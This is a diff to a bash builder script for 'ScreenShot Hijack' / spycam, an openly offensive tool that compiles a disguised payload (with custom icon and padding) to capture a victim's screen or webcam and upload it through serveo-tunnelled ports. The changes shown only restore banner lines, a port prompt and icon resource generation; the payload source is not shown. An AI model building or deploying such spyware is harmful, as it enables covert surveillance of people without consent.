@@ -20,8 +20,8 @@ printf "\n"
 printf "\e[1;93m Coded by:\e[0m\e[1;77m https://github.com/thelinuxchoice/spycam\e[0m"
 printf "\n"
 
-#printf "\e[1;77m          .:.:\e[0m\e[1;77m ScreenShot Hijack v1.0 \e[0m\e[1;77m:.:.\e[0m\n"                              
-#printf "\e[1;93m         .:.:\e[0m\e[1;93m Coded by: \e[0m\e[1;77m @linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
+printf "\e[1;77m          .:.:\e[0m\e[1;77m ScreenShot Hijack v1.0 \e[0m\e[1;77m:.:.\e[0m\n"                              
+printf "\e[1;93m         .:.:\e[0m\e[1;93m Coded by: \e[0m\e[1;77m @linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
 printf "\n"
 printf "     \e[101m::  Warning: Attacking targets without  ::\e[0m\n"
 printf "     \e[101m::  prior mutual consent is illegal!    ::\e[0m\n"
@@ -140,8 +140,8 @@ rm -rf Log.log
 default_port=$(seq 1111 4444 | sort -R | head -n1)
 default_port2=$(seq 1111 4444 | sort -R | head -n1)
 default_port3=$(seq 1111 4444 | sort -R | head -n1)
-#printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
-#read port
+printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+read port
 port="${port:-${default_port}}"
 default_payload_name="payload"
 printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
@@ -210,7 +210,7 @@ sed 's+serveo_port+'$default_port3'+g' spy.c >> cam.c
 sed 's+serveo_port+'$default_port3'+g' uploader.c >> up.c
 generatePadding 
 generatePadding
-#printf "id ICON \"%s\"" $payload_icon  > icon.rc
+printf "id ICON \"%s\"" $payload_icon  > icon.rc
 
 }
 
